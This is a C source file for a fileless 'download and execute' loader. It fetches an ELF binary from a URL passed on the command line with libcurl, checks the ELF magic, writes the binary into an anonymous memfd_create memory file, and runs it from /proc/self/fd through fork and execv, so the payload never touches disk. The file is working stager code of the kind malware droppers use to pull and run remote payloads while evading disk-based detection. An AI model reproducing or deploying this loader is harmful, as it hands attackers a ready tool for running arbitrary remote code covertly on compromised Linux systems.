#define _GNU_SOURCE
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/wait.h>

#include <errno.h>
#include <unistd.h>

#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <stdint.h>
#include <string.h>

#include <curl/curl.h>

#define EXPECT_NOT(res, err, msg) \
  do {                            \
    if ((err) == (res)) {         \
      perror(msg);                \
      abort();                    \
    }                             \
  } while (0)

#define EXPECT(res, err, msg) \
  do {                        \
    if ((err) != (res)) {     \
      perror(msg);            \
      abort();                \
    }                         \
  } while (0)

#define EXPECT_CUSTOM(res, err, msg)           \
  do {                                         \
    if ((err) != (res)) {                      \
      fprintf(stderr, "%s: %d\n", msg, errno); \
      abort();                                 \
    }                                          \
  } while (0)

#define UNUSED(x) ((void)x)

size_t write_callback(void* data, size_t size, size_t nmemb, void* userp) {
  static bool    first_run    = true;
  static uint8_t elf_header[] = {'\177', 'E', 'L', 'F'};

  if (first_run) {
    errno = 0;
    EXPECT_CUSTOM(memcmp(data, elf_header, 4), 0, "[!] Server didnt return an ELF executable");
  }

  ssize_t written = write(*(int*)userp, data, nmemb * size);

  EXPECT_NOT(written, -1, "[!] Cannot write file chunk to memory");

  first_run = false;
  return written;
}

int create_mem_fd(void) {
  int out_fd = memfd_create("prog", 0);
  EXPECT_NOT(out_fd, -1, "[!] Cannot create memory file");
  return out_fd;
}

void download_to_fd(int* fd, char* url) {
  CURL* curl = curl_easy_init();
  EXPECT_NOT(curl, NULL, "[!] Cannot create CURL object");

  curl_easy_setopt(curl, CURLOPT_URL, url);
  curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
  curl_easy_setopt(curl, CURLOPT_WRITEDATA, fd);

  CURLcode res = curl_easy_perform(curl);

  errno = 0;
  EXPECT_CUSTOM(res, CURLE_OK, "[!] Download failed");

  curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &errno);
  EXPECT_CUSTOM(errno, 200, "[!] Server returned error");

  curl_easy_cleanup(curl);
}

char* fd_to_path(int fd) {
  char* ret = NULL;
  EXPECT_NOT(asprintf(&ret, "/proc/self/fd/%d", fd), -1, "[!] Cannot allocate string");
  return ret;
}

void exec_file(char* path, char* argv[]) {
  int pid = fork();
  EXPECT_NOT(pid, -1, "[!] Cannot fork");

  if (pid == 0) {  // Child process
    printf("[+] Child started:\n");
    execv(path, argv);

  } else {  // Parent process
    int status = 0;
    EXPECT_NOT(waitpid(pid, &status, 0), -1, "[!] Cannot call waitpid on child process");

    if (WIFEXITED(status)) {
      printf("[-] Child process %d terminated normally with code %d\n", pid, WEXITSTATUS(status));

    } else if (WIFSIGNALED(status)) {
      printf("[-] Child process %d terminated by signal %d\n", pid, WTERMSIG(status));
    }
  }
}

int main(int argc, char* argv[]) {
  if (argc != 2) {
    printf("[!] No URL specified\n");
    return -1;
  }

  int fd = create_mem_fd();
  download_to_fd(&fd, argv[1]);

  char* fd_path     = fd_to_path(fd);
  char* mock_argv[] = {fd_path, NULL};

  exec_file(fd_path, mock_argv);

  free(fd_path);
  close(fd);

  return 0;
}
